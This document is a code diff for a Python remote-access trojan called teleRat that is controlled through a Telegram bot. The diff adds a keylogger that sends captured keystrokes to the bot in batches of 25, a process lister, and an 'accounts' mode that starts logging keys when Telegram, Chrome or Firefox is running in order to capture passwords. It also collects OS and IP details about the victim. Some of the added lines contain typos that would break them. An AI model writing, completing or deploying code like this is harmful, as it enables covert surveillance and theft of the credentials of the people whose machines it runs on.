@@ -1,17 +1,26 @@
+'''Script Information
+Version: 1.0.5
+Author: Yakuza.D(daya)
+Github: https://github.com/pythonInBlack/teleRat
+
+'''
+
+
 import requests
 from bs4 import BeautifulSoup
 import json
-import time
+#import time
 import platform
-import os
+#import os
+import psutil
 import subprocess
-import wmi
-import ngrok
+#import wmi
+#import ngrok
 from colorama import Fore, Back, Style
-import ipapi
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
-
+# import ipapi
+# from telegram import Update
+# from telegram.ext import Application, CommandHandler, ContextTypes
+from pynput import keyboard
 
 userIp  = ''
 userLocation = ''
@@ -23,6 +32,9 @@ class TeleManager():
         self.userIp = ''
         self.userLocation = ''
         self.allCommands = ['2','34']
+        self.keys = []
+        self.procs = {}
+        self.commonAccountProcessNames = ['Telegram.exe','chrome.exe','firefox.exe']
 
     def ip_enum(self):
         '''
@@ -153,7 +165,7 @@ class TeleManager():
             Operation System: {platform.system()} 💻
             OS Versions: {platform.version()} 🆚 => {platform.release()} 📦
             Host Name: {platform.uname().node} 
-            OS CPU Family: {platform.processor()} => {platform.uname().machine}            
+            OS CPU Family: {platform.procsessor()} => {platform.uname().machine}            
             OS CPU Model: {osCpuFormated}
             OS Detailed Version: {platform.win32_ver()}
             
@@ -262,6 +274,81 @@ class TeleManager():
             
         return self.allCommands
     
+    def keyboard_log(self,key):    
+         # Check for CTRL+C  
+        if key == keyboard.Key.ctrl_r:  
+            print(Fore.GREEN + '[+] Key Logger - Right-CTRL Detected, Exiting...' + Style.RESET_ALL)
+            self.send_message(f'Keylogger Stopped ⛔, Until Now Target Pressed => \n{self.keys}')
+            self.keys.clear()
+            return False
+            
+    
+            
+        #Check Character key pressed
+        if type(key) == keyboard._win32.KeyCode:
+            print(f'Pressed: {key.char}')
+            key = key.char 
+            self.keys.append(key)
+        
+        #Append Special Key pressed
+        #self.keys.append(str(key))
+        
+        #send if 10 key pressed
+        if len(self.keys) == 25:
+            print(Fore.YELLOW + '[+] Key Logger - 25 Key Pressed, Now Sending to T-Bot...' +Style.RESET_ALL)
+            self.send_message(str(self.keys))
+            self.keys.clear()
+                 
+    def keyboard_start(self):
+        print(Back.LIGHTWHITE_EX+Fore.BLACK + '[+] Key Logger - Key Logging Started, Press Right-CTRL to Stop Logger ' +Style.RESET_ALL)
+        
+        try:
+            with keyboard.Listener(on_press=self.keyboard_log) as listener:
+                listener.join()
+        except KeyboardInterrupt:
+            print(Fore.LIGHTRED_EX + '[-] Keyboard Logger => Exit !!!'+Style.RESET_ALL)
+
+    def procss_list(self):
+        pids = psutil.pids()
+        
+        for pid in pids:
+            self.procs.update({psutil.procsess(pid).name():pid})
+        
+        print(Fore.LIGHTGREEN_EX+f'[+] procsess List => \n'+Style.RESET_ALL)
+
+        for name,pid in self.procs.items():
+            print(Fore.YELLOW+f'[+] procsess => '+Fore.LIGHTWHITE_EX+ name + f' {pid}' +Style.RESET_ALL)
+        
+        return self.procs
+    
+    def log_accounts(self):
+        try:
+            #print(Back.LIGHTYELLOW_EX+Fore.BLACK+f'[+] Accounts KeyLogger(telegram, chrome, ...) =>  \n'+Style.RESET_ALL)
+            pids = psutil.pids()
+            procNames = []
+            for pid in pids:
+                procNames.append(psutil.Process(pid).name())
+            
+            matched_pairs = [(i, j) for i in self.commonAccountProcessNames for j in procNames if i == j]
+            print(Fore.YELLOW+f'[+] Accounts KeyLogger for => '+Style.RESET_ALL,end='')
+            for pair in matched_pairs:
+                print(Back.LIGHTWHITE_EX+Fore.BLACK+f' {pair[0]} -',end='')
+            print(Style.RESET_ALL+'\n')
+            
+            for proc in self.commonAccountProcessNames:
+                if proc in procNames:
+                    self.keyboard_start()
+                    return True
+            else:
+                print(Fore.LIGHTRED_EX + '[-] Accounts KeyLogger => No Special Process Found!!!'+Style.RESET_ALL)
+                return False
+        
+        except KeyboardInterrupt:
+            print(Fore.LIGHTRED_EX + '[-] Keyboard Logger => Exit !!!'+Style.RESET_ALL)
+
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + '[-] Accounts KeyLogger => Unknown Error happened...'+Style.RESET_ALL)
+            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
     def list_command(self):
         '''summary
         This function send List of Commands to user
@@ -270,32 +357,39 @@ class TeleManager():
         #os.system('neofetch')
         
         listCmd = f'''
-        /list => Show List of Commands \n
-        /send => Send New Message \n
-        /none => Run New Command \n
-        /os => Get OS Information \n
-        /ip => Get IP Information \n
-        /help => Get Help \n
-        /exit => Exit from Bot \n
+        /list => Show List of Commands
+        /send => Send New Message 
+        /none => Run New Command
+        /os => Get OS Information
+        /ip => Get IP Information
+        /help => Get Help
+        /exit => Exit from Bot
         '''
-        print(Back.MAGENTA+Fore.LIGHTWHITE_EX+listCmd+Style.RESET_ALL)
+        print(Fore.LIGHTYELLOW_EX+listCmd+Style.RESET_ALL)
         return listCmd
         #self.send_message(listCmd)
         #self.allCommands.append(listCmd)
     
     def usage_options(self):
+        userInput = ''
         options = '''
         [0] => Send Message 
         [1] => OS Enumeration 
         [2] => IP Enumeration 
         [3] => Last Command from Bot 
         [4] => All Commands from Bot 
-        [5] => Help - All Commands 
+        [5] => Keyboard Logger
+        [6] => procsess List
+        [7] => Logged Accounts Passwords
+         
         🥷
-        [99] => Exit 👋👋👋
+        [q] => Exit with Notification 👋👋👋
+        [sq] => Silent Exit👋👋👋
+        [h] => Help - All T-Bot Command List
         '''
         print(options)
         #Get User Input
+        
         userInput = str(input(Fore.LIGHTMAGENTA_EX + 'Select Option: ' + Style.RESET_ALL))
 
         #Check User Input
@@ -315,11 +409,20 @@ class TeleManager():
             return 'allcmd', 4
         
         elif userInput == '5':
-            return 'help', 5
+            return 'keylogger', 5
         
-        elif userInput == '99':
+        elif userInput == '6':
+            return 'procs', 6
+        
+        elif userInput == '7':
+            return 'logacc', 7
+        
+        elif userInput.lower() == 'h':
+            return 'help', 'h'
+            
+        elif userInput.lower() == 'q':
             self.exit_bot()
-        elif userInput == '00':
+        elif userInput.lower() == 'sq':
             exit()
         else:
             print(Fore.LIGHTRED_EX + '[-] Usage Options => Invalid Command!!!'+Style.RESET_ALL)
@@ -334,57 +437,57 @@ class TeleManager():
         exit()
         
 
-class TeleRat(TeleManager):
-    def __init__(self, token, userId):
-        super().__init__(token, userId)
-        self.token = token
-        self.userId = userId
-        self.userIp = ''
-        self.userLocation = ''
-        self.allCommands = self.all_commands()
+# class TeleRat(TeleManager):
+#     def __init__(self, token, userId):
+#         super().__init__(token, userId)
+#         self.token = token
+#         self.userId = userId
+#         self.userIp = ''
+#         self.userLocation = ''
+#         self.allCommands = self.all_commands()
     
-    def tester(self):
-        super().last_command()
-        self.list_command()
-        return self.allCommands
+#     def tester(self):
+#         super().last_command()
+#         self.list_command()
+#         return self.allCommands
     
-    def do_command(self):
-        '''summary
-        this function get last command from bot and then execute it
-        '''
-        lastCmd = self.last_command()
+#     def do_command(self):
+#         '''summary
+#         this function get last command from bot and then execute it
+#         '''
+#         lastCmd = self.last_command()
         
         
-class BotHandler():   
-    def __init__(self, token):
-        self.token = token
+# class BotHandler():   
+#     def __init__(self, token):
+#         self.token = token
         
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        await update.message.replay_text('Hello Ninja 🥷👋👋👋')
+#     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+#         await update.message.replay_text('Hello Ninja 🥷👋👋👋')
     
-    async def help(self, update, context):
-        await update.message.reply_text('''
-        /list => Show List of Commands \n
-        /send => Send New Message \n
-        /none => Run New Command \n
-        /os => Get OS Information \n
-        /ip => Get IP Information \n
-        /help => Get Help \n
-        /exit => Exit from Bot \n
-        ''')
+#     async def help(self, update, context):
+#         await update.message.reply_text('''
+#         /list => Show List of Commands \n
+#         /send => Send New Message \n
+#         /none => Run New Command \n
+#         /os => Get OS Information \n
+#         /ip => Get IP Information \n
+#         /help => Get Help \n
+#         /exit => Exit from Bot \n
+#         ''')
         
-    async def main(self):
-        #Build Application
-        application = Application.builder().token(self.token).build()
+#     async def main(self):
+#         #Build Application
+#         application = Application.builder().token(self.token).build()
         
-        #Add Command Handlers to Bot
-        application.add_handler(CommandHandler('start', self.start))
-        application.add_handler(CommandHandler('help', self.help))
+#         #Add Command Handlers to Bot
+#         application.add_handler(CommandHandler('start', self.start))
+#         application.add_handler(CommandHandler('help', self.help))
         
-        await application.initialize()
-        await application.start()
-        await application.updater.start_polling()
-        #await application.run_until_disconnected()
+#         await application.initialize()
+#         await application.start()
+#         await application.updater.start_polling()
+#         #await application.run_until_disconnected()
     
 
         
@@ -420,9 +523,22 @@ def bot_runner():
             
             #telegram.all_command_normal_mode()
             continue
-
+        
+        elif option[0] == 'keylogger':
+            #Check this Condition (all commands)
+            telegram.keyboard_start()
+            #telegram.all_command_normal_mode()
+            continue
+        
         elif option[0] == 'help':
             telegram.list_command()
+            continue
+        
+        elif option[0] == 'procs':
+            telegram.procss_list()
+            continue
+        elif option[0] == 'logacc':
+            telegram.log_accounts()
             continue
         
         #telegram.send_message(telegram.os_enum())
@@ -447,7 +563,10 @@ def rat_runner():
 def main():
     #bot_runner()
     #print(f'[+] IP: {userIp} in {userLocation} Country')
-    bot_runner()
+    try:
+        bot_runner()
+    except KeyboardInterrupt:
+        print(Fore.LIGHTRED_EX + '[-] CTRL+C Detecting => Exit !!!'+Style.RESET_ALL)
 
 if __name__ == '__main__':
     
